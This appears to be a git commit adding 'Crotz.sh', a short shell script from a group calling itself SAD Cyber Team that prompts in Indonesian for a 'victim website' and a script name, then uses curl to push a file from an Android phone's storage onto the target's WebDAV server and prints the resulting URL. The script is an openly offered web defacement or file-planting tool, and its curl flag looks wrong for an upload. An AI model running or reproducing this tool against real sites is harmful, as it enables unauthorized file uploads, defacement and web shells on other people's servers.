148967a7636789e5baa6e38442bd4921ff1cb7d1
SadCyberTeam <45815442+SADCyberTeam@users.noreply.github.com>
2018-12-14 19:17:53 +0700

    Create Crotz.sh

---
+++ Crotz.sh
@@ -0,0 +1,16 @@
+ figlet -f slant "WEBDAV" | lolcat
+echo ""
+echo ""
+echo "==============================" | lolcat
+echo ""
+echo $blue "Created By Me : ./TuanStar" | lolcat
+echo "Contact : 0895422939836" | lolcat
+echo "S.A.D Cyber Team " | lolcat
+echo ""
+echo "==============================" | lolcat
+echo ""
+echo ""
+read -p "Masukkan web korban  ~# " target
+read -p "Nama script lu coeg  ~# "  sc;
+curl -a /storage/emulated/0/$sc $target
+echo "Hasilnya :v |==>"  $target/$sc
